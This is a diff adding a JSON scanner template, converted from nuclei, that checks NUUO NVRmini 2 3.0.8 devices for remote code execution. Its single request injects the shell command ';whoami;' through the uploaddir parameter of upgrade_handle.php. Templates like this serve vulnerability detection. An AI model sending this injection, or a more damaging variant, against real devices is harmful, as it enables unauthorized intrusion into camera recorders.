@@ -1,0 +1,149 @@
+{
+  "id": "nuuo-nvrmini2-rce",
+  "name": "NUUO NVRmini 2 3.0.8 - Remote Code Execution",
+  "author": "berkdusunur",
+  "severity": "CRITICAL",
+  "description": "NUUO NVRmini 2 3.0.8 is susceptible to remote code execution.\n",
+  "references": [
+    "https://www.exploit-db.com/exploits/45070",
+    "https://github.com/berkdsnr/NUUO-NVRMINI-RCE",
+    "https://packetstormsecurity.com/files/151573/NUUO-NVRmini-upgrade_handle.php-Remote-Command-Execution.html"
+  ],
+  "tags": [
+    "rce",
+    "nuuo",
+    "nvrmini",
+    "edb",
+    "packetstorm"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/upgrade_handle.php?cmd\u003dwriteuploaddir\u0026uploaddir\u003d%27;whoami;%27",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "/upload_tmp_dir/"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "nuuo-nvrmini2-rce",
+    "info": {
+      "name": "NUUO NVRmini 2 3.0.8 - Remote Code Execution",
+      "author": "berkdusunur",
+      "severity": "critical",
+      "description": "NUUO NVRmini 2 3.0.8 is susceptible to remote code execution.\n",
+      "reference": [
+        "https://www.exploit-db.com/exploits/45070",
+        "https://github.com/berkdsnr/NUUO-NVRMINI-RCE",
+        "https://packetstormsecurity.com/files/151573/NUUO-NVRmini-upgrade_handle.php-Remote-Command-Execution.html"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "rce,nuuo,nvrmini,edb,packetstorm"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/upgrade_handle.php?cmd\u003dwriteuploaddir\u0026uploaddir\u003d%27;whoami;%27"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "/upload_tmp_dir/"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
